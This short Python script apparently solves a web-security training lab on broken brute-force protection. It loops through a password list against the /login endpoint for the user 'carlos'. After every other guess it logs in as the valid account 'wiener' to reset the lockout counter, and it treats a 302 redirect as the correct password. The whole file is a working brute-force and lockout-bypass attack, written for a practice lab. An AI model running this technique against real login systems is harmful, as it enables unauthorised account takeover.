from ...utils import (
    auth_lab_usernames,
    auth_lab_passwords,
    print_info,
    print_info_secondary,
    print_success,
    print_fail,
)


def solve_lab(session):
    passwords = auth_lab_passwords()
    print_success("Success.\n")

    # Password enumeration
    user = "carlos"
    print_info(f"Brute-forcing {user}'s password...")
    for i, password in enumerate(passwords):
        if i % 2 == 1:
            # Reset number of failed attempts with valid login
            data = {"username": "wiener", "password": "peter"}
            session.post_path("/login", data=data, allow_redirects=False)

        headers = None
        data = {"username": user, "password": password}
        resp = session.post_path("/login", data=data, allow_redirects=False)

        if resp.status_code != 302:
            print_info_secondary(f"{password} => Incorrect", end="\x1b[1K")
        else:
            print_success(f"{password} => Correct!\n")
            break
    else:
        print_fail(f"Unable to brute-force {user}'s password.")

    session.login(user, password, with_csrf=False)
